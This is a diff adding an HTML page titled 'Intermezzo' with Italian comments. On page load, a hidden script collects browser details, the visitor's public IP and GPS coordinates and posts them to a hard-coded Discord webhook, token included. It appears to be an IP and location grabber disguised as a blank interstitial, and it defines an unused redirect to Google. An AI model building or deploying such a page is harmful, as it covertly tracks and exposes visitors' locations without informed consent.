@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intermezzo</title>
+</head>
+<body>
+
+<script>
+    // Informazioni dal browser
+var userAgent = navigator.userAgent;
+var platform = navigator.platform;
+var appName = navigator.appName;
+var appVersion = navigator.appVersion;
+var language = navigator.language;
+var product = navigator.product;
+var vendor = navigator.vendor;
+var cookiesEnabled = navigator.cookieEnabled;
+var javaEnabled = navigator.javaEnabled();
+var screenWidth = window.screen.width;
+var screenHeight = window.screen.height;
+var screenColorDepth = window.screen.colorDepth;
+var currentURL = window.location.href;
+var referrer = document.referrer;
+
+// Ottieni l'indirizzo IP utilizzando un servizio esterno
+var ipAddress = '';
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    ipAddress = data.ip;
+
+    // Se l'utente ha dato il consenso, ottieni la localizzazione
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        // Invia tutte le informazioni al webhook di Discord
+        sendToDiscord(userAgent, platform, appName, appVersion, language, product, vendor, cookiesEnabled, javaEnabled, screenWidth, screenHeight, screenColorDepth, currentURL, referrer, ipAddress, latitude, longitude);
+      });
+    } else {
+      // Invia le informazioni al webhook senza la localizzazione
+      sendToDiscord(userAgent, platform, appName, appVersion, language, product, vendor, cookiesEnabled, javaEnabled, screenWidth, screenHeight, screenColorDepth, currentURL, referrer, ipAddress);
+    }
+  });
+
+
+    // Una volta raccolte le informazioni, reindirizza l'utente alla pagina finale
+    function redirectToFinalPage() {
+        window.location.href = "https://www.google.com"; // Sostituisci con l'URL della tua pagina finale
+    }
+
+    // Dopo aver inviato le informazioni al webhook, chiama la funzione di reindirizzamento
+    function sendToDiscord(userAgent, platform, appName, appVersion, language, product, vendor, cookiesEnabled, javaEnabled, screenWidth, screenHeight, screenColorDepth, currentURL, referrer, ipAddress, latitude = null, longitude = null) {
+  var webhookURL = 'https://discord.com/api/webhooks/1148611002687037513/KJ_vELPAPQ4yQr7Wke5ky7Y6nyY2b8wqPmhjRS18wemECITwxjO2p3zcCO9jMjncu9bG'; // Sostituisci con l'URL del tuo webhook
+
+  var messageContent = `
+User Agent: ${userAgent}
+Platform: ${platform}
+App Name: ${appName}
+App Version: ${appVersion}
+Language: ${language}
+Product: ${product}
+Vendor: ${vendor}
+Cookies Enabled: ${cookiesEnabled}
+Java Enabled: ${javaEnabled}
+Screen Width: ${screenWidth}
+Screen Height: ${screenHeight}
+Screen Color Depth: ${screenColorDepth}
+Current URL: ${currentURL}
+Referrer: ${referrer}
+IP Address: ${ipAddress}
+Latitude: ${latitude}
+Longitude: ${longitude}
+  `;
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content: messageContent
+    }),
+  });
+}
+
+</script>
+
+</body>
+</html>
